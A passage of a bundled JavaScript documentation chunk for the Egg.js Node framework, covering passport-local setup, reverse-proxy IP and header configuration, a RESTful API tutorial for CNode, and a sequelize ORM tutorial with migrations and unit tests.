`,paraId:36,tocIndex:10},{value:"Configuration:",paraId:37,tocIndex:10},{value:`// {plugin_root}/config/config.default.js
// https://github.com/jaredhanson/passport-local
exports.passportLocal = {};
`,paraId:38,tocIndex:10},{value:"Note: ",paraId:39,tocIndex:10},{value:"egg-passport",paraId:39,tocIndex:10},{value:" standardizes the configuration fields, which are unified as ",paraId:39,tocIndex:10},{value:"key",paraId:39,tocIndex:10},{value:" and ",paraId:39,tocIndex:10},{value:"secret",paraId:39,tocIndex:10},{value:", so if the corresponding Passport middleware attribute names are inconsistent, the developer should do the conversion.",paraId:39,tocIndex:10},{value:"Register the passport middleware:",paraId:40,tocIndex:10},{value:`// {plugin_root}/app.js
const LocalStrategy = require('passport-local').Strategy;

module.exports = (app) => {
  const config = app.config.passportLocal;
  config.passReqToCallback = true;

  app.passport.use(
    new LocalStrategy(config, (req, username, password, done) => {
      // Cleans up the data returned by the Passport plugin and returns the User object
      const user = {
        provider: 'local',
        username,
        password,
      }; // This does not process application-level logic and passes it to app.passport.verify for unified processing.
      app.passport.doVerify(req, user, done);
    }),
  );
};
`,paraId:41,tocIndex:10}]},13381:function(n,a,e){e.r(a),e.d(a,{texts:function(){return t}});var o=e(58479);const t=[{value:"Generally, our services will not directly accept external requests, but will deploy the services behind the access layer, thus achieving load balancing of multiple machines and smooth distribution of services to ensure high availability.",paraId:0},{value:"In this scenario, we can't directly get the connection to the real user request, so we can't confirm the user's real IP, request protocol, or even the requested host. To solve this problem, the framework provides a set of configuration items by default for developers to configure to enable the application layer to obtain real user request information based on the agreement(de facto) with the access layer.",paraId:1},{value:"The proxy mode can be enabled by ",paraId:2,tocIndex:0},{value:"config.proxy = true",paraId:2,tocIndex:0},{value:":",paraId:2,tocIndex:0},{value:`// config/config.default.js

exports.proxy = true;
`,paraId:3,tocIndex:0},{value:"Note that after this mode is enabled, the application defaults to being behind the reverse proxy. It will support the request header of the resolved protocol to obtain the real IP, protocol and host of the client. If your service is not deployed behind a reverse proxy, do not enable this configuration in case a malicious user falsifies information such as requesting IP.",paraId:4,tocIndex:0},{value:"config.ipHeaders",paraId:5},{value:"When the proxy configuration is enabled, the app parses the ",paraId:6,tocIndex:1},{value:"X-Forwarded-For",paraId:6,tocIndex:1},{value:" request header to get the real IP of the client. If your reverse proxy passes this information through other request headers, it can be configured via ",paraId:6,tocIndex:1},{value:"config.ipHeaders",paraId:6,tocIndex:1},{value:", which supports multiple headers (comma separated).",paraId:6,tocIndex:1},{value:`// config/config.default.js

exports.ipHeaders = 'X-Real-Ip, X-Forwarded-For';
`,paraId:7,tocIndex:1},{value:"config.maxIpsCount",paraId:5},{value:"The general format of the ",paraId:8,tocIndex:2},{value:"X-Forwarded-For",paraId:8,tocIndex:2},{value:" field is:",paraId:8,tocIndex:2},{value:`X-Forwarded-For: client, proxy1, proxy2
`,paraId:9,tocIndex:2},{value:"We can use the first IP address as the real IP adderess of the request, but if a malicious user passes the ",paraId:10,tocIndex:2},{value:"X-Forwarded-For",paraId:10,tocIndex:2},{value:" header in the request to spoof it after some reverse proxy, it will cause ",paraId:10,tocIndex:2},{value:"X-Forwarded-For",paraId:10,tocIndex:2},{value:" to take The value obtained is inaccurate and can be used to spoof the request IP address, breaking some IP restrictions of the application layer.",paraId:10,tocIndex:2},{value:`X-Forwarded-For: fake, client, proxy1, proxy2
`,paraId:11,tocIndex:2},{value:"In order to avoid this problem, we can configure the number of reverse proxies through ",paraId:12,tocIndex:2},{value:"config.maxIpsCount",paraId:12,tocIndex:2},{value:", so the fake IP address passed by the user will be ignored. For example, if we deploy the application behind a unified access layer (such as Alibaba Cloud SLB, Amazon ELB), we can configure this configuration to ",paraId:12,tocIndex:2},{value:"1",paraId:12,tocIndex:2},{value:" so that users cannot forge IP addresses through the ",paraId:12,tocIndex:2},{value:"X-Forwarded-For",paraId:12,tocIndex:2},{value:" request header.",paraId:12,tocIndex:2},{value:`// config/config.default.js

exports.maxIpsCount = 1;
`,paraId:13,tocIndex:2},{value:"This configuration item has the same effect as ",paraId:14,tocIndex:2},{value:"options.maxIpsCount",paraId:14,tocIndex:2},{value:" provided by ",paraId:14,tocIndex:2},{value:"koa",paraId:14,tocIndex:2},{value:".",paraId:14,tocIndex:2},{value:"config.protocolHeaders",paraId:5},{value:"When the proxy configuration is enabled, the application will parse the [X-Forwarded-Proto] (",paraId:15,tocIndex:3},{value:"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-Proto",paraId:15,tocIndex:3},{value:") request header to get the client's Real access protocol. If your reverse proxy passes this information through other request headers, it can be configured via ",paraId:15,tocIndex:3},{value:"config.protocolHeaders",paraId:15,tocIndex:3},{value:", which supports multiple headers (comma separated).",paraId:15,tocIndex:3},{value:`// config/config.default.js

exports.protocolHeaders = 'X-Real-Proto, X-Forwarded-Proto';
`,paraId:16,tocIndex:3},{value:"config.hostHeaders",paraId:5},{value:"When the proxy configuration is enabled, the application still reads ",paraId:17,tocIndex:4},{value:"host",paraId:17,tocIndex:4},{value:" directly to get the requested domain name. Most of the reverse proxy does not modify this value. But maybe some reverse proxy will pass the client's real access via [X-Forwarded-Host] (",paraId:17,tocIndex:4},{value:"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-Host",paraId:17,tocIndex:4},{value:") The domain name can be configured via ",paraId:17,tocIndex:4},{value:"config.hostHeaders",paraId:17,tocIndex:4},{value:", which supports multiple headers (comma separated).",paraId:17,tocIndex:4},{value:`// config/config.default.js

exports.hostHeaders = 'X-Forwarded-Host';
`,paraId:18,tocIndex:4}]},16426:function(n,a,e){e.r(a),e.d(a,{texts:function(){return t}});var o=e(42877);const t=[{value:"Web frameworks are widely used for providing interfaces to the client through Web services. Let's use an example ",paraId:0},{value:"CNode Club",paraId:0},{value:" to show how to build ",paraId:0},{value:"RESTful",paraId:0},{value:" API using Egg.",paraId:0},{value:"CNode currently use v1 interface is not fully consistent with the RESTful semantic. In the article, we will encapsulate a more RESTful semantic V2 API based on CNode V1 interface.",paraId:1},{value:`Designing a RESTful-style API, we will identify the status of response by the response status code, keeping the response body simply and only the interface data is returned.
A example of `,paraId:2,tocIndex:0},{value:"topics",paraId:2,tocIndex:0},{value:" is shown below:",paraId:2,tocIndex:0},{value:"GET /api/v2/topics",paraId:3,tocIndex:1},{value:"status code: 200",paraId:3,tocIndex:1},{value:"response body:",paraId:3,tocIndex:1},{value:`[
  {
    "id": "57ea257b3670ca3f44c5beb6",
    "author_id": "541bf9b9ad60405c1f151a03",
    "tab": "share",
    "content": "content",
    "last_reply_at": "2017-01-11T13:32:25.089Z",
    "good": false,
    "top": true,
    "reply_count": 155,
    "visit_count": 28176,
    "create_at": "2016-09-27T07:53:31.872Z"
  },
  {
    "id": "57ea257b3670ca3f44c5beb6",
    "author_id": "541bf9b9ad60405c1f151a03",
    "tab": "share",
    "content": "content",
    "title": "Finished Rewriting of Let's Learning Node.js Together",
    "last_reply_at": "2017-01-11T10:20:56.496Z",
    "good": false,
    "top": true,
    "reply_count": 193,
    "visit_count": 47633
  }
]
`,paraId:4,tocIndex:1},{value:"GET /api/v2/topics/57ea257b3670ca3f44c5beb6",paraId:5,tocIndex:2},{value:"status code: 200",paraId:5,tocIndex:2},{value:"response body:",paraId:5,tocIndex:2},{value:`{
  "id": "57ea257b3670ca3f44c5beb6",
  "author_id": "541bf9b9ad60405c1f151a03",
  "tab": "share",
  "content": "content",
  "title": "Finished Rewriting of Let's Learning Node.js Together",
  "last_reply_at": "2017-01-11T10:20:56.496Z",
  "good": false,
  "top": true,
  "reply_count": 193,
  "visit_count": 47633
}
`,paraId:6,tocIndex:2},{value:"POST /api/v2/topics",paraId:7,tocIndex:3},{value:"status code: 201",paraId:7,tocIndex:3},{value:"response body:",paraId:7,tocIndex:3},{value:`{
  "topic_id": "57ea257b3670ca3f44c5beb6"
}
`,paraId:8,tocIndex:3},{value:"PUT /api/v2/topics/57ea257b3670ca3f44c5beb6",paraId:9,tocIndex:4},{value:"status code: 204",paraId:9,tocIndex:4},{value:"response body: null",paraId:9,tocIndex:4},{value:"When an error is occurring, 4xx status code is returned if occurred by client-side request parameters and 5xx status code is returned if occurred by server-side logic processing. All error objects are used as the description for status exceptions.",paraId:10,tocIndex:5},{value:"For example, passing invalided parameters from the client may return a response with status code 422, the response body as shown below:",paraId:11,tocIndex:5},{value:`{
  "error": "Validation Failed",
  "detail": [
    { "message": "required", "field": "title", "code": "missing_field" }
  ]
}
`,paraId:12,tocIndex:5},{value:"After interface convention, we begin to create a RESTful API.",paraId:13,tocIndex:6},{value:"Initializes the application using ",paraId:14,tocIndex:7},{value:"npm",paraId:14,tocIndex:7},{value:" in the ",paraId:14,tocIndex:7},{value:"quickstart",paraId:15,tocIndex:7},{value:`$ mkdir cnode-api && cd cnode-api
$ npm init egg --type=simple
$ npm i
`,paraId:16,tocIndex:7},{value:"egg-validate",paraId:17,tocIndex:8},{value:" is used to present the validate plugin.",paraId:17,tocIndex:8},{value:`// config/plugin.js
exports.validate = {
  enable: true,
  package: 'egg-validate',
};
`,paraId:18,tocIndex:8},{value:"First of all, we follower previous design to register ",paraId:19,tocIndex:9},{value:"router",paraId:20,tocIndex:9},{value:". The framework provides a simply way to create a RESTful-style router and mapping the resources to the corresponding controllers.",paraId:19,tocIndex:9},{value:`// app/router.js
module.exports = (app) => {
  app.router.resources('topics', '/api/v2/topics', app.controller.topics);
};
`,paraId:21,tocIndex:9},{value:"Mapping the 'topics' resource's CRUD interfaces to the ",paraId:22,tocIndex:9},{value:"app/controller/topics.js",paraId:22,tocIndex:9},{value:" using ",paraId:22,tocIndex:9},{value:"app.resources",paraId:22,tocIndex:9},{value:"In ",paraId:23,tocIndex:10},{value:"controller",paraId:24,tocIndex:10},{value:", we only need to implement the interface convention of ",paraId:23,tocIndex:10},{value:"app.resources",paraId:23,tocIndex:10},{value:" ",paraId:23,tocIndex:10},{value:"RESTful style URL definition",paraId:25,tocIndex:10},{value:". For example, creating a 'topics' interface:",paraId:23,tocIndex:10},{value:`// app/controller/topics.js
const Controller = require('egg').Controller;

// defining the rule of request parameters
const createRule = {
  accesstoken: 'string',
  title: 'string',
  tab: { type: 'enum', values: ['ask', 'share', 'job'], required: false },
  content: 'string',
};

class TopicController extends Controller {
  async create() {
    const ctx = this.ctx;
    // validate the \`ctx.request.body\` with the expected format
    // status = 422 exception will be thrown if not passing the parameter validation
    ctx.validate(createRule, ctx.request.body);
    // call service to create a topic
    const id = await ctx.service.topics.create(ctx.request.body);
    // configure the response body and status code
    ctx.body = {
      topic_id: id,
    };
    ctx.status = 201;
  }
}
module.exports = TopicController;
`,paraId:26,tocIndex:10},{value:"As shown above, a Controller mainly implements the following logic:",paraId:27,tocIndex:10},{value:"call the validate function to validate the request parameters",paraId:28,tocIndex:10},{value:"create a topic by calling service encapsulates business logic using the validated parameters",paraId:28,tocIndex:10},{value:"configure the status code and context according to the interface convention",paraId:28,tocIndex:10},{value:"We will more focus on writing effective business logic in ",paraId:29,tocIndex:11},{value:"service",paraId:30,tocIndex:11},{value:".",paraId:29,tocIndex:11},{value:`// app/service/topics.js
const Service = require('egg').Service;

class TopicService extends Service {
  constructor(ctx) {
    super(ctx);
    this.root = 'https://cnodejs.org/api/v1';
  }

  async create(params) {
    // call CNode V1 API
    const result = await this.ctx.curl(\`\${this.root}/topics\`, {
      method: 'post',
      data: params,
      dataType: 'json',
      contentType: 'json',
    });
    // check whether the call was successful, throws an exception if it fails
    this.checkSuccess(result);
    // return the id of topis
    return result.data.topic_id;
  }

  // Encapsulated a uniform check function, can be reused in query, create, update and such on in service
  checkSuccess(result) {
    if (result.status !== 200) {
      const errorMsg =
        result.data && result.data.error_msg
          ? result.data.error_msg
          : 'unknown error';
      this.ctx.throw(result.status, errorMsg);
    }
    if (!result.data.success) {
      // remote response error
      this.ctx.throw(500, 'remote response error', { data: result.data });
    }
  }
}

module.exports = TopicService;
`,paraId:31,tocIndex:11},{value:"After developing the Service of topic creation, an interface have been completed from top to bottom.",paraId:32,tocIndex:11},{value:"Normal business logic has been completed, but exceptions have not yet been processed. Controller and Service may throw an exception as the previous coding, so it is recommended that throwing an exception to interrupt if passing invalided parameters from the client or calling the back-end service with exception.",paraId:33,tocIndex:12},{value:"use Controller ",paraId:34,tocIndex:12},{value:"this.ctx.validate()",paraId:34,tocIndex:12},{value:" to validate the parameters, throw exception if it fails.",paraId:34,tocIndex:12},{value:"call Service ",paraId:34,tocIndex:12},{value:"this.ctx.curl()",paraId:34,tocIndex:12},{value:" to access CNode API, may throw server exception due to network problems.",paraId:34,tocIndex:12},{value:"an exception also will be thrown after Service is getting the response of calling failure from CNode API.",paraId:34,tocIndex:12},{value:"Default error handling is provided but might be inconsistent as the interface convention previously. We need to implement a unified error-handling middleware to handle the errors.",paraId:35,tocIndex:12},{value:"Create a file ",paraId:36,tocIndex:12},{value:"error_handler.js",paraId:36,tocIndex:12},{value:" under ",paraId:36,tocIndex:12},{value:"app/middleware",paraId:36,tocIndex:12},{value:" directory to create a new ",paraId:36,tocIndex:12},{value:"middleware",paraId:37,tocIndex:12},{value:`// app/middleware/error_handler.js
module.exports = () => {
  return async function errorHandler(ctx, next) {
    try {
      await next();
    } catch (err) {
      // All exceptions will trigger an error event on the app and the error log will be recorded
      ctx.app.emit('error', err, ctx);

      const status = err.status || 500;
      // error 500 not returning to client when in the production environment because it may contain sensitive information
      const error =
        status === 500 && ctx.app.config.env === 'prod'
          ? 'Internal Server Error'
          : err.message;

      // Reading from the properties of error object and set it to the response
      ctx.body = { error };
      if (status === 422) {
        ctx.body.detail = err.errors;
      }
      ctx.status = status;
    }
  };
};
`,paraId:38,tocIndex:12},{value:"We can catch all exceptions and follow the expected format to encapsulate the response through the middleware. It can be loaded into application using configuration file (",paraId:39,tocIndex:12},{value:"config/config.default.js",paraId:39,tocIndex:12},{value:")",paraId:39,tocIndex:12},{value:`// config/config.default.js
module.exports = {
  // load the errorHandler middleware
  middleware: ['errorHandler'],
  // only takes effect on URL prefix with '/api'
  errorHandler: {
    match: '/api',
  },
};
`,paraId:40,tocIndex:12},{value:"Completing the coding just the first step, furthermore we need to add ",paraId:41,tocIndex:13},{value:"Unit Test",paraId:42,tocIndex:13},{value:" to the code.",paraId:41,tocIndex:13},{value:"Let's start writing the unit test for the Controller. We can simulate the implementation of the Service layer in an appropriate way because the most important part is to test the logic as for Controller. And mocking up the Service layer according the convention of interface, so we can develop layered testing because the Service layer itself can also covered by Service unit test.",paraId:43,tocIndex:14},{value:`const { app, mock, assert } = require('egg-mock/bootstrap');

describe('test/app/controller/topics.test.js', () => {
  // test the response of passing the error parameters
  it('should POST /api/v2/topics/ 422', () => {
    app.mockCsrf();
    return app
      .httpRequest()
      .post('/api/v2/topics')
      .send({
        accesstoken: '123',
      })
      .expect(422)
      .expect({
        error: 'Validation Failed',
        detail: [
          { message: 'required', field: 'title', code: 'missing_field' },
          { message: 'required', field: 'content', code: 'missing_field' },
        ],
      });
  });

  // mock up the service layer and test the response of normal request
  it('should POST /api/v2/topics/ 201', () => {
    app.mockCsrf();
    app.mockService('topics', 'create', 123);
    return app
      .httpRequest()
      .post('/api/v2/topics')
      .send({
        accesstoken: '123',
        title: 'title',
        content: 'hello',
      })
      .expect(201)
      .expect({
        topic_id: 123,
      });
  });
});
`,paraId:44,tocIndex:14},{value:"As the Controller testing above, we create an application using ",paraId:45,tocIndex:14},{value:"egg-mock",paraId:45,tocIndex:14},{value:" and simulate the client to send request through ",paraId:45,tocIndex:14},{value:"SuperTest",paraId:45,tocIndex:14},{value:". In the testing, we also simulate the response from Service layer to test the processing logic of Controller layer",paraId:45,tocIndex:14},{value:"Unit Test of Service layer may focus on the coding logic. ",paraId:46,tocIndex:15},{value:"egg-mock",paraId:46,tocIndex:15},{value:" provides a quick method to test the Service by calling the test method in the Service, and SuperTest to simulate the client request is no longer needed.",paraId:46,tocIndex:15},{value:`const { app, mock, assert } = require('egg-mock/bootstrap');

describe('test/app/service/topics.test.js', () => {
  let ctx;

  beforeEach(() => {
    // create a global context object so that can call the service function on a ctx object
    ctx = app.mockContext();
  });

  describe('create()', () => {
    it('should create failed by accesstoken error', async () => {
      try {
        // calling service method on ctx directly
        await ctx.service.topics.create({
          accesstoken: 'hello',
          title: 'title',
          content: 'content',
        });
      } catch (err) {
        assert(err.status === 401);
        assert(err.message === 'error accessToken');
      }
      throw 'should not run here';
    });

    it('should create success', async () => {
      // not affect the normal operation of CNode by simulating the interface calling of CNode based on interface convention
      // app.mockHttpclient method can easily simulate the appliation's HTTP request
      app.mockHttpclient(\`\${ctx.service.topics.root}/topics\`, 'POST', {
        data: {
          success: true,
          topic_id: '5433d5e4e737cbe96dcef312',
        },
      });

      const id = await ctx.service.topics.create({
        accesstoken: 'hello',
        title: 'title',
        content: 'content',
      });
      assert(id === '5433d5e4e737cbe96dcef312');
    });
  });
});
`,paraId:47,tocIndex:15},{value:"In the testing of Service layer above, we create a Context object using the ",paraId:48,tocIndex:15},{value:"app.createContext()",paraId:48,tocIndex:15},{value:" which provided by egg-mock and call the Service method on Context object to test directly. It can use ",paraId:48,tocIndex:15},{value:"app.mockHttpclient()",paraId:48,tocIndex:15},{value:" to simulate the response of calling HTTP request, which allows us to focus on the logic testing of Service layer without the impact of environment.",paraId:48,tocIndex:15},{value:"See the full example at ",paraId:49,tocIndex:15},{value:"eggjs/examples/cnode-api",paraId:49,tocIndex:15},{value:".",paraId:49,tocIndex:15}]},8300:function(n,a,e){e.r(a),e.d(a,{texts:function(){return t}});var o=e(60388);const t=[{value:"In the previous section",paraId:0},{value:", we showed how to access the database through the ",paraId:1},{value:"egg-mysql",paraId:1},{value:" plugin in the framework. In some more complex applications, we may need an ORM framework to help us manage the data layer code. In the Node.js community, ",paraId:1},{value:"sequelize",paraId:1},{value:" is a widely used ORM framework that supports multiple data sources such as MySQL, PostgreSQL, SQLite, and MSSQL.",paraId:1},{value:"In this chapter, we will walk through the steps of how to use sequelize in an egg project by developing an example of doing CURD on the data in the ",paraId:2},{value:"users",paraId:2},{value:" table in MySQL.",paraId:2},{value:"In this example, we will use sequelize to connect to the MySQL data source, so we need to install MySQL on the machine before we start writing code. If it is MacOS, we can quickly install it via homebrew:",paraId:3,tocIndex:0},{value:`brew install mysql
brew services start mysql
`,paraId:4,tocIndex:0},{value:"Init project by ",paraId:5,tocIndex:1},{value:"npm",paraId:5,tocIndex:1},{value:":",paraId:5,tocIndex:1},{value:`$ mkdir sequelize-project && cd sequelize-project
$ npm init egg --type=simple
$ npm i
`,paraId:6,tocIndex:1},{value:"Install and configure the ",paraId:7,tocIndex:1},{value:"egg-sequelize",paraId:7,tocIndex:1},{value:" plugin (which will help us load the defined Model object onto ",paraId:7,tocIndex:1},{value:"app",paraId:7,tocIndex:1},{value:" and ",paraId:7,tocIndex:1},{value:"ctx",paraId:7,tocIndex:1},{value:" ) and the ",paraId:7,tocIndex:1},{value:"mysql2",paraId:7,tocIndex:1},{value:" module:",paraId:7,tocIndex:1},{value:"Install",paraId:8,tocIndex:1},{value:`npm install --save egg-sequelize mysql2
`,paraId:9,tocIndex:1},{value:"Import egg-sequelize in ",paraId:10,tocIndex:1},{value:"config/plugin.js",paraId:10,tocIndex:1},{value:`exports.sequelize = {
  enable: true,
  package: 'egg-sequelize',
};
`,paraId:11,tocIndex:1},{value:"Write the sequelize configuration in ",paraId:12,tocIndex:1},{value:"config/config.default.js",paraId:12,tocIndex:1},{value:`exports.sequelize = {
  dialect: 'mysql',
  host: '127.0.0.1',
  port: 3306,
  database: 'egg-sequelize-doc-default',
};
`,paraId:13,tocIndex:1},{value:"We can configure different data source addresses in different environment configurations to distinguish the databases used by different environments. For example, we can create a new ",paraId:14,tocIndex:1},{value:"config/config.unittest.js",paraId:14,tocIndex:1},{value:" configuration file and write the following configuration. The connected database points to ",paraId:14,tocIndex:1},{value:"egg-sequelize-doc-unittest",paraId:14,tocIndex:1},{value:".",paraId:14,tocIndex:1},{value:`exports.sequelize = {
  dialect: 'mysql',
  host: '127.0.0.1',
  port: 3306,
  database: 'egg-sequelize-doc-unittest',
};
`,paraId:15,tocIndex:1},{value:"After completing the above configuration, a project using sequelize is initialized. ",paraId:16,tocIndex:1},{value:"egg-sequelize",paraId:16,tocIndex:1},{value:" and ",paraId:16,tocIndex:1},{value:"sequelize",paraId:16,tocIndex:1},{value:" also support more configuration items, which can be found in their documentation.",paraId:16,tocIndex:1},{value:"Next, let's temporarily leave the code of the egg project, design and initialize our database. First, we quickly create two databases for development and testing locally using the mysql command:",paraId:17,tocIndex:2},{value:"mysql -u root -e 'CREATE DATABASE IF NOT EXISTS `egg-sequelize-doc-default`;'\nmysql -u root -e 'CREATE DATABASE IF NOT EXISTS `egg-sequelize-doc-unittest`;'\n",paraId:18,tocIndex:2},{value:"Then we started designing the ",paraId:19,tocIndex:2},{value:"users",paraId:19,tocIndex:2},{value:" table, which has the following data structure:",paraId:19,tocIndex:2},{value:"CREATE TABLE `users` (\n  `id` int(11) NOT NULL AUTO_INCREMENT COMMENT 'primary key',\n  `name` varchar(30) DEFAULT NULL COMMENT 'user name',\n  `age` int(11) DEFAULT NULL COMMENT 'user age',\n  `created_at` datetime DEFAULT NULL COMMENT 'created time',\n  `updated_at` datetime DEFAULT NULL COMMENT 'updated time',\n  PRIMARY KEY (`id`)\n) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='user';\n",paraId:20,tocIndex:2},{value:"We can build the table directly through the mysql command, but this is not a good practice for multiplayer collaboration. During the evolution of the project, each iteration is possible to make changes to the database data structure, how to track the data changes of each iteration, and quickly change the data structure in different environments (development, testing, CI) and switch bettween iterative? At this point we need ",paraId:21,tocIndex:2},{value:"Migrations",paraId:21,tocIndex:2},{value:" to help us manage the changes in the data structure.",paraId:21,tocIndex:2},{value:"Sequelize provides the ",paraId:22,tocIndex:2},{value:"sequelize-cli",paraId:22,tocIndex:2},{value:" tool to implement ",paraId:22,tocIndex:2},{value:"Migrations",paraId:22,tocIndex:2},{value:", and we can also introduce sequelize-cli in the egg project.",paraId:22,tocIndex:2},{value:"Install ",paraId:23,tocIndex:2},{value:"sequelize-cli",paraId:23,tocIndex:2},{value:`npm install --save-dev sequelize-cli
`,paraId:24,tocIndex:2},{value:"In the egg project, we want to put all the database Migrations related content in the ",paraId:25,tocIndex:2},{value:"database",paraId:25,tocIndex:2},{value:" directory, so we create a new ",paraId:25,tocIndex:2},{value:".sequelizerc",paraId:25,tocIndex:2},{value:" configuration file in the project root directory:",paraId:25,tocIndex:2},{value:`'use strict';

const path = require('path');

module.exports = {
  config: path.join(__dirname, 'database/config.json'),
  'migrations-path': path.join(__dirname, 'database/migrations'),
  'seeders-path': path.join(__dirname, 'database/seeders'),
  'models-path': path.join(__dirname, 'app/model'),
};
`,paraId:26,tocIndex:2},{value:"Init Migrations Configuration Files and Directories",paraId:27,tocIndex:2},{value:`npx sequelize init:config
npx sequelize init:migrations
`,paraId:28,tocIndex:2},{value:"After the execution, the ",paraId:29,tocIndex:2},{value:"database/config.json",paraId:29,tocIndex:2},{value:" file and the ",paraId:29,tocIndex:2},{value:"database/migrations",paraId:29,tocIndex:2},{value:" directory will be generated. We will modify the contents of ",paraId:29,tocIndex:2},{value:"database/config.json",paraId:29,tocIndex:2},{value:". It was changed to the database configuration used in our project:",paraId:29,tocIndex:2},{value:`{
  "development": {
    "username": "root",
    "password": null,
    "database": "egg-sequelize-doc-default",
    "host": "127.0.0.1",
    "dialect": "mysql"
  },
  "test": {
    "username": "root",
    "password": null,
    "database": "egg-sequelize-doc-unittest",
    "host": "127.0.0.1",
    "dialect": "mysql"
  }
}
`,paraId:30,tocIndex:2},{value:"At this point sequelize-cli and related configuration are also initialized, we can start writing the project's first Migration file to create one of our ",paraId:31,tocIndex:2},{value:"users",paraId:31,tocIndex:2},{value:" table.",paraId:31,tocIndex:2},{value:`npx sequelize migration:generate --name=init-users
`,paraId:32,tocIndex:2},{value:"After execution, a migration file (",paraId:33,tocIndex:2},{value:"${timestamp}-init-users.js",paraId:33,tocIndex:2},{value:") is generated in the ",paraId:33,tocIndex:2},{value:"database/migrations",paraId:33,tocIndex:2},{value:" directory. We modify it to handle initializing the ",paraId:33,tocIndex:2},{value:"users",paraId:33,tocIndex:2},{value:" table:",paraId:33,tocIndex:2},{value:`'use strict';

module.exports = {
  // The function called when performing a database upgrade, create a \`users\` table
  up: async (queryInterface, Sequelize) => {
    const { INTEGER, DATE, STRING } = Sequelize;
    await queryInterface.createTable('users', {
      id: { type: INTEGER, primaryKey: true, autoIncrement: true },
      name: STRING(30),
      age: INTEGER,
      created_at: DATE,
      updated_at: DATE,
    });
  },
  // The function called when performing a database downgrade, delete the \`users\` table
  down: async (queryInterface) => {
    await queryInterface.dropTable('users');
  },
};
`,paraId:34,tocIndex:2},{value:"Execute migrate for database changes",paraId:35,tocIndex:2},{value:`# upgrade database
npx sequelize db:migrate
# if there is a problem that needs to be rolled back, you can roll back a change via \`db:migrate:undo\`
# npx sequelize db:migrate:undo
# can be rolled back to the initial state via \`db:migrate:undo:all\`
# npx sequelize db:migrate:undo:all
`,paraId:36,tocIndex:2},{value:"After execution, our database initialization is complete.",paraId:37,tocIndex:2},{value:"Finally we can start writing code to implement business logic. First, let's write the user model in the ",paraId:38,tocIndex:3},{value:"app/model/",paraId:38,tocIndex:3},{value:" directory:",paraId:38,tocIndex:3},{value:`'use strict';

module.exports = (app) => {
  const { STRING, INTEGER, DATE } = app.Sequelize;

  const User = app.model.define('user', {
    id: { type: INTEGER, primaryKey: true, autoIncrement: true },
    name: STRING(30),
    age: INTEGER,
    created_at: DATE,
    updated_at: DATE,
  });

  return User;
};
`,paraId:39,tocIndex:3},{value:"This model can be accessed in the Controller and Service via ",paraId:40,tocIndex:3},{value:"app.model.User",paraId:40,tocIndex:3},{value:" or ",paraId:40,tocIndex:3},{value:"ctx.model.User",paraId:40,tocIndex:3},{value:", for example we write ",paraId:40,tocIndex:3},{value:"app/controller/users.js",paraId:40,tocIndex:3},{value:":",paraId:40,tocIndex:3},{value:`// app/controller/users.js
const Controller = require('egg').Controller;

function toInt(str) {
  if (typeof str === 'number') return str;
  if (!str) return str;
  return parseInt(str, 10) || 0;
}

class UserController extends Controller {
  async index() {
    const ctx = this.ctx;
    const query = {
      limit: toInt(ctx.query.limit),
      offset: toInt(ctx.query.offset),
    };
    ctx.body = await ctx.model.User.findAll(query);
  }

  async show() {
    const ctx = this.ctx;
    ctx.body = await ctx.model.User.findByPk(toInt(ctx.params.id));
  }

  async create() {
    const ctx = this.ctx;
    const { name, age } = ctx.request.body;
    const user = await ctx.model.User.create({ name, age });
    ctx.status = 201;
    ctx.body = user;
  }

  async update() {
    const ctx = this.ctx;
    const id = toInt(ctx.params.id);
    const user = await ctx.model.User.findByPk(id);
    if (!user) {
      ctx.status = 404;
      return;
    }

    const { name, age } = ctx.request.body;
    await user.update({ name, age });
    ctx.body = user;
  }

  async destroy() {
    const ctx = this.ctx;
    const id = toInt(ctx.params.id);
    const user = await ctx.model.User.findByPk(id);
    if (!user) {
      ctx.status = 404;
      return;
    }

    await user.destroy();
    ctx.status = 200;
  }
}

module.exports = UserController;
`,paraId:41,tocIndex:3},{value:"Finally we will mount this controller on the route:",paraId:42,tocIndex:3},{value:`// app/router.js
module.exports = (app) => {
  const { router, controller } = app;
  router.resources('users', '/users', controller.users);
};
`,paraId:43,tocIndex:3},{value:"The interface for the CURD operation of the ",paraId:44,tocIndex:3},{value:"users",paraId:44,tocIndex:3},{value:" table is developed. To verify that the code logic is correct, we need to write some testcases to verify.",paraId:44,tocIndex:3},{value:"Before writing the test, because in the previous egg configuration, we pointed the unit test environment and development environment to different databases, so we need to initialize the data structure of the test database through Migrations:",paraId:45,tocIndex:4},{value:`NODE_ENV=test npx sequelize db:migrate:up
`,paraId:46,tocIndex:4},{value:"Unit tests with database access are particularly cumbersome to write directly, We need to create a series of data to prepare the test data is a very cumbersome process. To simplify single testing, we can quickly create test data with the ",paraId:47,tocIndex:4},{value:"factory-girl",paraId:47,tocIndex:4},{value:" module.",paraId:47,tocIndex:4},{value:"Install ",paraId:48,tocIndex:4},{value:"factory-girl",paraId:48,tocIndex:4},{value:`npm install --save-dev factory-girl
`,paraId:49,tocIndex:4},{value:"Define the data model of factory-girl into ",paraId:50,tocIndex:4},{value:"test/factories.js",paraId:50,tocIndex:4},{value:`// test/factories.js
'use strict';

const { factory } = require('factory-girl');

module.exports = (app) => {
  // Factory instance can be accessed via app.factory
  app.factory = factory;

  // Define user and default data
  factory.define('user', app.model.User, {
    name: factory.sequence('User.name', (n) => \`name_\${n}\`),
    age: 18,
  });
};
`,paraId:51,tocIndex:4},{value:"Initialize the file ",paraId:52,tocIndex:4},{value:"test/.setup.js",paraId:52,tocIndex:4},{value:", introduce the factory, and ensure that the data is cleaned after the test is executed to avoid being affected.",paraId:52,tocIndex:4},{value:`const { app } = require('egg-mock/bootstrap');
const factories = require('./factories');

before(() => factories(app));
afterEach(async () => {
  // clear database after each test case
  await Promise.all([app.model.User.destroy({ truncate: true, force: true })]);
});
`,paraId:53,tocIndex:4},{value:"Then we can start writing real test cases:",paraId:54,tocIndex:4},{value:`// test/app/controller/users.test.js
const { assert, app } = require('egg-mock/bootstrap');

describe('test/app/controller/users.test.js', () => {
  describe('GET /users', () => {
    it('should work', async () => {
      // Quickly create some users object into the database via factory-girl
      await app.factory.createMany('user', 3);
      const res = await app.httpRequest().get('/users?limit=2');
      assert(res.status === 200);
      assert(res.body.length === 2);
      assert(res.body[0].name);
      assert(res.body[0].age);
    });
  });

  describe('GET /users/:id', () => {
    it('should work', async () => {
      const user = await app.factory.create('user');
